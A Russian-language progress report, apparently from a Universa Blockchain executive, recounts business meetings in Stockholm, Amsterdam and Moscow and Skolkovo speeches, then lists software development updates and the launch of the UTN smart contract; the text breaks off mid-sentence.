\u0428\u0432\u0435\u0446\u0438\u0438 \u0432 \u0447\u0435\u0441\u0442\u044c 10-\u043b\u0435\u0442\u0438\u044f \u0432\u044b\u043f\u0443\u0441\u043a\u0430 \u043d\u0430\u0448\u0435\u0439 \u0433\u0440\u0443\u043f\u043f\u044b MBA \u0438\u0437 \u0421\u0442\u043e\u043a\u0433\u043e\u043b\u044c\u043c\u0441\u043a\u043e\u0439 \u0428\u043a\u043e\u043b\u044b \u042d\u043a\u043e\u043d\u043e\u043c\u0438\u043a\u0438. \u0420\u0430\u0441\u0441\u043a\u0430\u0437\u0430\u043b \u0441\u0432\u043e\u0438\u043c \u043e\u0434\u043d\u043e\u043a\u0443\u0440\u0441\u043d\u0438\u043a\u0430\u043c \u043f\u0440\u043e \u0443\u0441\u043f\u0435\u0445\u0438 \u042e\u043d\u0438\u0432\u0435\u0440\u0441\u044b, \u0431\u0443\u0434\u0435\u043c \u0434\u0440\u0443\u0436\u0438\u0442\u044c \u043f\u0440\u043e\u0435\u043a\u0442\u0430\u043c\u0438.\u041f\u0435\u0440\u0435\u0433\u043e\u0432\u043e\u0440\u044b \u0441 \u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0441\u0442\u0432\u043e\u043c \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u0433\u043e \u0438\u043d\u0442\u0435\u0433\u0440\u0430\u0442\u043e\u0440\u0430 Asseco Group(https://asseco.com) \u043f\u0440\u043e \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u0443\u044e \u0440\u0430\u0431\u043e\u0442\u0443 \u0432 \u0415\u0432\u0440\u043e\u043f\u0435\u0439\u0441\u043a\u0438\u0445 \u0441\u0442\u0440\u0430\u043d\u0430\u0445 \u043d\u0430\u0434 \u043f\u0440\u043e\u0435\u043a\u0442\u0430\u043c\u0438 \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u044f Universa Blockchain \u0432 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u0438\u0439 \u0438 \u0441\u0442\u0440\u0430\u0445\u043e\u0432\u043e\u0439 \u0441\u0435\u043a\u0442\u043e\u0440\u0430 \u0440\u044b\u043d\u043a\u043e\u0432 \u0415\u0432\u0440\u043e\u043f\u044b.\u041f\u0440\u043e\u0432\u0435\u043b\u0438 \u043f\u0435\u0440\u0435\u0433\u043e\u0432\u043e\u0440\u044b \u0441 \u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0441\u0442\u0432\u043e\u043c TechGarden \u041a\u0430\u0437\u0430\u0445\u0441\u0442\u0430\u043d (https://techgarden.kz), \u0434\u043e\u0433\u043e\u0432\u043e\u0440\u0438\u043b\u0438\u0441\u044c \u043e \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u0435 \u043d\u0430\u0434 \u043f\u0440\u043e\u0435\u043a\u0442\u0430\u043c\u0438 \u0432 \u043e\u0431\u043b\u0430\u0441\u0442\u0438 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d.\u0410\u043c\u0441\u0442\u0435\u0440\u0434\u0430\u043cING Bank + Universa Blockchain = Secure Blockchain Solutions for\u00a0bank\u0412\u0438\u0437\u0438\u0442 \u0432 \u0410\u043c\u0441\u0442\u0435\u0440\u0434\u0430\u043c \u043d\u0430\u0447\u0430\u043b\u0441\u044f \u0441 \u043f\u0435\u0440\u0435\u0433\u043e\u0432\u043e\u0440\u043e\u0432 \u0441 ING Bank (https://www.ing.com/Home.htm)\u00a0, \u043e\u0431\u0441\u0443\u0436\u0434\u0430\u043b\u0438 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u0440\u043e\u0435\u043a\u0442\u043e\u0432 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d\u0430 Universa \u0432 \u0431\u0430\u043d\u043a. \u0411\u0443\u0434\u0443 \u0440\u0430\u0434, \u0435\u0441\u043b\u0438 \u0442\u0430\u043a\u043e\u0439 \u0443\u0432\u0430\u0436\u0430\u0435\u043c\u044b\u0439 \u0431\u0430\u043d\u043a \u0432 \u0438\u0442\u043e\u0433\u0435 \u0432\u044b\u0431\u0435\u0440\u0435\u0442 \u0438\u043c\u0435\u043d\u043d\u043e \u043d\u0430\u0448\u0443 \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u044e. Let\u2019s keep our fingers crossed \ud83d\ude09EY building in Amsterdam\u041f\u043e\u0441\u043b\u0435 \u044d\u0442\u043e\u0433\u043e \u0443 \u043d\u0430\u0441 \u0431\u044b\u043b\u0430 \u0432\u0441\u0442\u0440\u0435\u0447\u0430 \u0441 EY (http://ey.com), \u0433\u0434\u0435 \u043c\u044b \u043e\u0431\u0441\u0443\u0436\u0434\u0430\u043b\u0438 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b. \u0412 \u0438\u0434\u0435\u0430\u043b\u0435 EY \u0441 \u043d\u0430\u0448\u0435\u0439 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0434\u043e\u043b\u0436\u0435\u043d \u043e\u043f\u0438\u0441\u044b\u0432\u0430\u0442\u044c \u043a\u0435\u0439\u0441 \u0434\u043b\u044f \u043a\u043b\u0438\u0435\u043d\u0442\u0430, \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0439 \u0438\u043d\u0442\u0435\u0433\u0440\u0430\u0442\u043e\u0440 \u0432 \u043d\u0430\u0448\u0435\u0439 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0432\u043d\u0435\u0434\u0440\u044f\u0442\u044c. \u0418 \u0442\u043e\u0433\u0434\u0430 \u043c\u044b \u0441\u043c\u043e\u0436\u0435\u043c \u0432 \u0433\u043e\u0434 \u0434\u0435\u043b\u0430\u0442\u044c \u0433\u043e\u0440\u0430\u0437\u0434\u043e \u0431\u043e\u043b\u044c\u0448\u0435 \u043f\u0440\u043e\u0435\u043a\u0442\u043e\u0432, \u0447\u0435\u043c \u0441\u0430\u043c\u043e\u0441\u0442\u043e\u044f\u0442\u0435\u043b\u044c\u043d\u043e. \u0420\u0430\u0431\u043e\u0442\u0430\u0435\u043c \u0438\u043c\u0435\u043d\u043d\u043e \u0442\u0430\u043a \u0442\u0430\u043a\u0438\u043c \u0441\u043f\u043e\u0441\u043e\u0431\u043e\u043c \u0437\u0430\u0445\u0432\u0430\u0442\u0430 \u0434\u043e\u043b\u0438 \u0440\u044b\u043d\u043a\u0430 \u0432 \u0415\u0432\u0440\u043e\u043f\u0435, \u0410\u0437\u0438\u0438 \u0438 \u0410\u0444\u0440\u0438\u043a\u0435.\u041d\u0443 \u0438 \u0433\u043b\u0430\u0432\u043d\u043e\u0435, \u043f\u043e\u0441\u043b\u0435 \u044d\u0442\u0438\u0445 \u043d\u0435\u0441\u043e\u043c\u043d\u0435\u043d\u043d\u043e \u0432\u0430\u0436\u043d\u044b\u0445 \u0438 \u043d\u0443\u0436\u043d\u044b\u0445 \u0432\u0441\u0442\u0440\u0435\u0447, \u043f\u0440\u043e\u0448\u0435\u043b \u043f\u0435\u0440\u0432\u044b\u0439 \u043e\u0444\u0438\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439 meetup c \u043c\u043e\u043c\u0435\u043d\u0442\u0430 TokenSale \u0434\u043b\u044f \u043d\u0430\u0448\u0435\u0433\u043e \u0433\u043e\u043b\u043b\u0430\u043d\u0434\u0441\u043a\u043e\u0433\u043e \u043a\u043e\u043c\u043c\u044c\u044e\u043d\u0438\u0442\u0438.\u041d\u0430 \u043c\u0438\u0442\u0430\u043f\u0435 \u044f \u0440\u0430\u0441\u0441\u043a\u0430\u0437\u0430\u043b \u043f\u0440\u043e \u0442\u0435\u043a\u0443\u0449\u0438\u0435 \u043d\u0430\u0448\u0438 \u0434\u043e\u0441\u0442\u0438\u0436\u0435\u043d\u0438\u044f, \u043e\u043f\u0438\u0441\u0430\u043b \u0441\u0442\u0440\u0430\u0442\u0435\u0433\u0438\u044e \u0432\u044b\u0445\u043e\u0434\u0430 \u043d\u0430 \u043d\u043e\u0432\u044b\u0435 \u0440\u044b\u043d\u043a\u0438 \u0438 \u043e\u0431\u044a\u044f\u0441\u043d\u0438\u043b, \u043f\u043e\u0447\u0435\u043c\u0443 \u043f\u0440\u0438 \u043b\u044e\u0431\u044b\u0445 \u0441\u043e\u0431\u044b\u0442\u0438\u044f\u0445 Universa Blockchain \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442 \u0440\u0430\u0437\u0432\u0438\u0432\u0430\u0442\u044c\u0441\u044f \u0438 \u0440\u0430\u0441\u0442\u0438 \ud83d\ude03\u041d\u043e\u0447\u043d\u043e\u0439 \u043f\u0435\u0440\u0435\u043b\u0435\u0442 \u0432\u00a0\u041c\u043e\u0441\u043a\u0432\u0443.\u0423\u0442\u0440\u043e\u043c \u043f\u043e\u0441\u043b\u0435 \u043d\u0435\u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u043e\u0442\u0434\u044b\u0445\u0430 \u044f \u043e\u0442\u043f\u0440\u0430\u0432\u0438\u043b\u0441\u044f \u0432 Skolkovo \u043d\u0430 \u0432\u0441\u0442\u0440\u0435\u0447\u0443 \u0441 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u0438\u0442\u0435\u043b\u044f\u043c\u0438 GazPromNeft \u0434\u043b\u044f \u0440\u0430\u0437\u0433\u043e\u0432\u043e\u0440\u0430 \u043f\u0440\u043e \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0442\u043e\u043a\u0435\u043d\u0438\u0437\u0430\u0446\u0438\u0438 \u0438\u0445 \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0431\u0438\u0437\u043d\u0435\u0441\u0430.\u041f\u043e \u0434\u043e\u0440\u043e\u0433\u0435 \u0432\u0441\u0442\u0440\u0435\u0442\u0438\u043b Yury Mitin \u0438 \u043f\u043e\u043e\u0431\u0435\u0449\u0430\u043b \u0440\u0430\u0441\u0441\u043a\u0430\u0437\u0430\u0442\u044c \u0432 Skolkovo \u043d\u0430 \u043a\u043e\u043d\u0444\u0435\u0440\u0435\u043d\u0446\u0438\u0438 \u043f\u0440\u043e \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d \u043a\u0435\u0439\u0441 Universa, \u043d\u0430\u0447\u0438\u043d\u0430\u044f \u0441 \u0438\u0441\u0442\u043e\u0440\u0438\u0438 \u0437\u0430\u0440\u043e\u0436\u0434\u0435\u043d\u0438\u044f \u0438\u0434\u0435\u0438 \u043f\u0440\u043e\u0435\u043a\u0442\u0430 \u0434\u043e \u0441\u0435\u0433\u043e\u0434\u043d\u044f\u0448\u043d\u0435\u0433\u043e \u0434\u043d\u044f.\u041f\u043e\u0441\u043b\u0435 \u044d\u0442\u043e\u0439 \u0432\u0441\u0442\u0440\u0435\u0447\u0438 \u0432\u0435\u0440\u043d\u0443\u043b\u0441\u044f \u0432 \u041c\u043e\u0441\u043a\u0432\u0443 \u043d\u0430 \u0432\u0441\u0442\u0440\u0435\u0447\u0443 \u0441 \u043f\u043e\u0442\u0435\u043d\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u043c\u0438 \u0438\u043d\u0432\u0435\u0441\u0442\u043e\u0440\u0430\u043c\u0438 Universa, \u0441 \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u043c\u044b \u043e\u0431\u0441\u0443\u0436\u0434\u0430\u043b\u0438 \u0444\u043e\u0440\u043c\u0430\u0442 \u043f\u043e\u0442\u0435\u043d\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0445 \u0438\u043d\u0432\u0435\u0441\u0442\u0438\u0446\u0438\u0439, \u0440\u0430\u0437\u043c\u0435\u0440 \u0438 \u0433\u0430\u0440\u0430\u043d\u0442\u0438\u0438.\u0423\u0442\u0440\u043e\u043c \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e \u0434\u043d\u044f \u0436\u0443\u0440\u043d\u0430\u043b\u0438\u0441\u0442\u044b \u043f\u043e\u0441\u043d\u0438\u043c\u0430\u043b\u0438 \u0443 \u043d\u0430\u0441 \u0432 \u043e\u0444\u0438\u0441\u0435 \u0440\u0435\u043f\u043e\u0440\u0442\u0430\u0436 \u0438 \u044f \u043f\u043e\u0441\u043f\u0435\u0448\u0438\u043b \u043d\u0430 \u0432\u0441\u0442\u0440\u0435\u0447\u0443 \u0441 \u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u0435\u043c \u043e\u0434\u043d\u043e\u0433\u043e \u0438\u0437 \u043a\u0440\u0443\u043f\u043d\u044b\u0445 \u0444\u043e\u043d\u0434\u043e\u0432, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0445\u043e\u0442\u0435\u043b \u0431\u044b \u0438\u043d\u0432\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442\u044b \u043d\u0430 \u0431\u0430\u0437\u0435 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d\u0430 Universa. \u041e\u0431\u0441\u0443\u0436\u0434\u0430\u043b\u0438 \u043a\u0430\u043a\u0430\u044f \u0444\u0438\u043d\u0430\u043d\u0441\u043e\u0432\u0430\u044f \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u043c\u043e\u0433\u043b\u0430 \u0431\u044b\u0442\u044c \u043d\u0430\u043c \u043f\u043e\u043c\u043e\u0447\u044c \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0446\u0435\u0441\u0441.\u0412\u0441\u0442\u0440\u0435\u0447\u0430\u043b\u0438\u0441\u044c \u0441 \u043a\u043e\u043c\u0430\u043d\u0434\u043e\u0439, \u043f\u0440\u043e\u0432\u043e\u0434\u0438\u043b\u0438 \u0438\u043d\u0442\u0435\u0440\u0432\u044c\u044e \u0441 \u043d\u043e\u0432\u044b\u043c\u0438 \u0447\u043b\u0435\u043d\u0430\u043c\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0438 \u043f\u0440\u043e\u0447\u0430\u044f \u043d\u0435\u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u0430\u044f \u0442\u0435\u043a\u0443\u0447\u043a\u0430\u200a\u2014\u200a\u0440\u0430\u0431\u043e\u0442\u0430\u043b\u0438 \u0440\u0430\u0431\u043e\u0442\u0443 \ud83d\ude03\u041f\u0440\u043e\u0432\u0435\u043b\u0438 \u0432\u0430\u0436\u043d\u0443\u044e \u0432\u0441\u0442\u0440\u0435\u0447\u0443 \u0441 \u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0441\u0442\u0432\u043e\u043c \u043e\u0434\u043d\u043e\u0439 \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0438 \u0438\u0437 \u0430\u0432\u0438\u0430\u043e\u0442\u0440\u0430\u0441\u043b\u0438, \u0442\u0435\u043f\u0435\u0440\u044c \u0431\u0443\u0434\u0435\u043c \u043c\u0443\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e \u0433\u043e\u0442\u043e\u0432\u0438\u0442\u044c \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u044b, \u0447\u0442\u043e\u0431\u044b \u043e\u0431\u044a\u044f\u0432\u0438\u0442\u044c \u043e \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u043c \u043f\u0440\u043e\u0435\u043a\u0442\u0435.\u041f\u0440\u043e\u0440\u044b\u0432\u043d\u044b\u0435 \u0438\u043d\u043d\u043e\u0432\u0430\u0446\u0438\u0438 \u0441 \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0435\u0439 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d\u042f \u0432\u044b\u0441\u0442\u0443\u043f\u0438\u043b \u043d\u0430 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d \u043a\u043e\u043d\u0444\u0435\u0440\u0435\u043d\u0446\u0438\u0438 \u0432 \u0421\u043a\u043e\u043b\u043a\u043e\u0432\u043e \u0438 \u0440\u0430\u0441\u0441\u043a\u0430\u0437\u0430\u043b \u0438\u0441\u0442\u043e\u0440\u0438\u044e \u043d\u0430\u0448\u0435\u0433\u043e \u043f\u0440\u043e\u0435\u043a\u0442\u0430, \u0432\u0441\u0435 \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u044b \u0438 \u043f\u043e\u0434\u0432\u043e\u0434\u043d\u044b\u0435 \u043a\u0430\u043c\u043d\u0438, \u0430 \u0442\u0430\u043a \u0436\u0435 \u0432\u0435\u0441\u044c \u043f\u043e\u0442\u0435\u043d\u0446\u0438\u0430\u043b \u0440\u044b\u043d\u043a\u0430, \u043d\u0430\u0448\u0435\u0439 \u043d\u0438\u0448\u0438 \u0438 \u0438\u0434\u0435\u043e\u043b\u043e\u0433\u0438\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u043e\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u043d\u0430\u0441, \u043a\u0430\u043a \u0440\u0435\u0448\u0435\u043d\u0438\u044f \u0431\u0435\u0437 \u043c\u0430\u0439\u043d\u0438\u043d\u0433\u0430, \u0431\u0435\u0437 \u043f\u0440\u0438\u0432\u044f\u0437\u043a\u0438 \u0441\u0442\u043e\u0438\u043c\u043e\u0441\u0442\u0438 \u0442\u0440\u0430\u043d\u0437\u0430\u043a\u0446\u0438\u0438 \u043a \u043a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u043b\u044e\u0442\u0435. \u0414\u0443\u043c\u0430\u044e \u0438\u0442\u043e\u0433\u043e\u043c \u044d\u0442\u043e\u0439 \u043a\u043e\u043d\u0444\u0435\u0440\u0435\u043d\u0446\u0438\u0438 \u0431\u0443\u0434\u0435\u0442 \u043f\u0430\u0440\u0430 \u043f\u0440\u043e\u0435\u043a\u0442\u043e\u0432 \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u0439 \u043d\u0430 \u0431\u0430\u0437\u0435 Universa \ud83d\ude03 \u041d\u0435 \u0437\u0440\u044f \u0441\u043e\u0433\u043b\u0430\u0441\u0438\u043b\u0441\u044f \u0447\u0438\u0442\u0430\u0442\u044c \u043b\u0435\u043a\u0446\u0438\u044e.\u0418 \u043d\u0430\u043a\u043e\u043d\u0435\u0446, \u043a\u0440\u0430\u0439\u043d\u0435 \u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0432\u044b\u0441\u0442\u0443\u043f\u043b\u0435\u043d\u0438\u0435 \u0432 \u043a\u043e\u0440\u043f\u043e\u0440\u0430\u0442\u0438\u0432\u043d\u043e\u043c \u0443\u043d\u0438\u0432\u0435\u0440\u0441\u0438\u0442\u0435\u0442\u0435 \u0421\u043a\u043e\u043b\u043a\u043e\u0432\u043e, \u0433\u0434\u0435 \u043c\u043d\u0435 \u043f\u0440\u0435\u0434\u0441\u0442\u043e\u044f\u043b\u043e \u0432\u044b\u0441\u0442\u0443\u043f\u0430\u0442\u044c \u043f\u043e\u0441\u043b\u0435 \u041a\u044c\u0435\u043b\u043b\u0430 \u041d\u043e\u0440\u0434\u0441\u0442\u0440\u0435\u043c\u0430 (https://en.wikipedia.org/wiki/Kjell_A._Nordstr\u00f6m) \u0438 \u0413\u0435\u0440\u043c\u0430\u043d\u0430 \u0413\u0440\u0435\u0444\u0430 (https://ru.wikipedia.org/wiki/\u0413\u0440\u0435\u0444,_\u0413\u0435\u0440\u043c\u0430\u043d_\u041e\u0441\u043a\u0430\u0440\u043e\u0432\u0438\u0447). \u0417\u0430\u0434\u0430\u0447\u0430 \u043d\u0435\u043f\u0440\u043e\u0441\u0442\u0430\u044f, \u043d\u043e \u0433\u043e\u0432\u043e\u0440\u044f\u0442, \u0447\u0442\u043e \u0430\u0443\u0434\u0438\u0442\u043e\u0440\u0438\u044f \u043e\u0441\u0442\u0430\u043b\u0430\u0441\u044c \u043e\u0447\u0435\u043d\u044c \u0434\u043e\u0432\u043e\u043b\u044c\u043d\u0430. \u041c\u044b \u043e\u0431\u0441\u0443\u0434\u0438\u043b\u0438 \u0442\u0440\u0435\u043d\u0434\u044b \u0431\u0443\u0434\u0443\u0449\u0435\u0433\u043e \u0438 \u0442\u043e, \u043a\u0430\u043a \u0438\u0437\u043c\u0435\u043d\u044f\u0442\u0441\u044f \u043f\u0440\u0438\u0432\u044b\u0447\u043d\u044b\u0435 \u043d\u0430\u043c \u0433\u043e\u0440\u043e\u0434\u0430, \u0434\u0435\u043d\u044c\u0433\u0438 \u0438 \u0432\u0437\u0430\u0438\u043c\u043e\u043e\u0442\u043d\u043e\u0448\u0435\u043d\u0438\u044f \u0441 \u043f\u0440\u0438\u0445\u043e\u0434\u043e\u043c \u043d\u043e\u0432\u044b\u0445 \u0440\u0430\u0441\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0445 \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0439. \u041a\u043e\u0433\u0434\u0430 \u0440\u0435\u0448\u0435\u043d\u0438\u044f \u0431\u0443\u0434\u0443\u0442 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0442\u044c \u043d\u0435 \u043a\u043e\u0440\u043f\u043e\u0440\u0430\u0446\u0438\u0438, \u0430 \u043c\u0438\u043b\u043b\u0438\u0430\u0440\u0434\u044b \u0440\u0430\u0441\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0445 \u043f\u043e \u0441\u0435\u0442\u0438 uBots\u200a\u2014\u200a\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u043d\u044b\u0445 \u0440\u043e\u0431\u043e\u0442\u043e\u0432(\u0441\u043c\u0430\u0440\u0442-\u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u043e\u0432), \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u0438 \u0441\u0442\u0430\u043d\u0443\u0442 \u0441\u043a\u043e\u0440\u043e \u0440\u0430\u0431\u043e\u0442\u0430\u044e\u0449\u0438\u0435 \u043f\u043e\u0432\u0435\u0440\u0445 Universa \u0443\u043c\u043d\u044b\u0435 \u0440\u0430\u0441\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0435 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u044b.#DevelopmentUniclient\u0420\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u044b\u0439 \u0440\u0435\u0436\u0438\u043c \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0444\u0430\u0439\u043b\u0430\u043c\u0438, \u0438\u0441\u043a\u043b\u044e\u0447\u0430\u044e\u0449\u0438\u0439 \u043f\u0435\u0440\u0435\u0437\u0430\u043f\u0438\u0441\u044c\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0440\u0435\u0432\u0438\u0437\u0438\u0439\u0418\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430 \u0430\u0433\u0440\u0435\u0433\u0430\u0446\u0438\u044f \u043a\u043e\u0448\u0435\u043b\u044c\u043a\u043e\u0432\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d split/join, \u043f\u043e\u043b\u043d\u043e\u0446\u0435\u043d\u043d\u0430\u044f \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430\u0414\u043e\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b \u0438 \u0438\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b\u200a\u2014\u200aimport (revision-of),\u200a\u2014\u200apack-with (add-referenced)\u0423\u043b\u0443\u0447\u0448\u0435\u043d\u0430 \u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u0441\u0435\u0442\u044c\u044e, \u0431\u043e\u043b\u0435\u0435 \u043f\u043e\u043b\u043d\u044b\u0439 \u0432\u044b\u0432\u043e\u0434 \u0434\u0430\u043d\u043d\u044b\u0445 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0430Java API/developers supportJavadoc: \u043e\u0442\u0434\u043e\u043a\u0443\u043c\u043d\u0435\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0430 \u0447\u0430\u0441\u0442\u044c \u043a\u043e\u0434\u0430, \u0432\u0430\u0436\u043d\u0430\u044f \u0434\u043b\u044f \u043a\u043b\u0438\u0435\u043d\u0442\u0441\u043a\u0438\u0445 \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u0439Knowledge Base \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0430 \u0441\u0435\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u043e\u0432: https://kb.universa.io/software_developer_central/32Code samples: ContractService class\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u043f\u043e\u0438\u0441\u043a \u043f\u043e \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430\u0446\u0438\u0438\u0414\u043b\u044f \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430\u0446\u0438\u0438: \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0430 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c \u0440\u0430\u0437\u0434\u0435\u043b\u044f\u0442\u044c \u0440\u0430\u0437\u0434\u0435\u043b\u044b \u043c\u0435\u0436\u0434\u0443 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430\u043c\u0438 (\u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u0440\u0438 \u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438)Universal Scala API early preview readyUniversal API is meant to be same in JMV/Scala.js platforms to provide high degree of scala code interoperability between end user UX applications (browser) and server applications (JVM)NodeNetwork upgraded to v.3.4.14Arbitrary attributes in transactional sectionReferences to transactional attributes (e.g. special purpose payments amd many other interesting applications)UNS1 contract fixedFixed several problems with permission conflicts.JavaScript/ScalaJS APIJS API Alfa is published (as compiled JSON) and available, preparing yarn dependecy supportScala.js API alfa early preview readyWebClient 2.0Started closed beta test, most functionality now works with itWebClient 1.*More functions are allowed without buying UWeb Integration API:Allows any 3rd pty services securely emit contracts (tokens) using Universa web client: https://kb.universa.io/web_client_integration/55Started beta testUTN Smart\u00a0Contract\u041d\u0443 \u0438 \u043d\u0430 \u0437\u0430\u043a\u0443\u0441\u043a\u0443\u200a\u2014\u200a\u0432\u044b \u043d\u0430\u0432\u0435\u0440\u043d\u043e\u0435 \u0443\u0436\u0435 \u0447\u0438\u0442\u0430\u043b\u0438 \u043d\u043e\u0432\u043e\u0441\u0442\u044c \u043f\u0440\u043e UTN Smart Contract. (https://medium.com/universablockchain/important-update-on-the-utn-smart-contract-token-distribution-and-future-swapping-of-tokens-dd3a1f4bb8df)\u0412\u0441\u0442\u0440\u0435\u0447\u0430\u0439\u0442\u0435\u200a\u2014\u200a\u0441\u043c\u0430\u0440\u0442-\u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0431\u0443\u0434\u0435\u0442 \u0445\u0440\u0430\u043d\u0438\u0442\u044c \u043d\u0430\u0448\u0438 UTN:https://universaexplorer.com/NPo4dIkNdgYfGiNrdExoX003+lFT%2Fd45OA6GifmcRoTzxSRSm5c5jDHBSTaAS+QleuN7ttX1rTvSQbHIIqkcK%2FzWjx%2FfCpP9ziwsgXbyyCtUhLqP9G4YZ+zEY%2FyL%2FGVE(\u043a\u043e\u0440\u043e\u0442\u043a\u0430\u044f \u0441\u0441\u044b\u043b\u043a\u0430): https://lnd.im/utn\u0417\u0430\u043f\u0438\u0441\u044c \u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0438 UTN\u200a\u2014\u200a\u0442\u043e\u043a\u0435\u043d\u0430 Universa \u0432 \u041e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u0435 Universa\u0415\u0441\u043b\u0438 \u0432\u0430\u043c \u043b\u044e\u0431\u043e\u043f\u044b\u0442\u043d\u043e \u0443\u0432\u0438\u0434\u0435\u0442\u044c \u0438\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u043a\u043e\u0434, \u0432\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0441\u043a\u0430\u0447\u0430\u0442\u044c \u0431\u0438\u043d\u0430\u0440\u043d\u044b\u0439 \u0444\u0430\u0439\u043b \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0430 \u043f\u0440\u044f\u043c\u043e \u0438\u0437 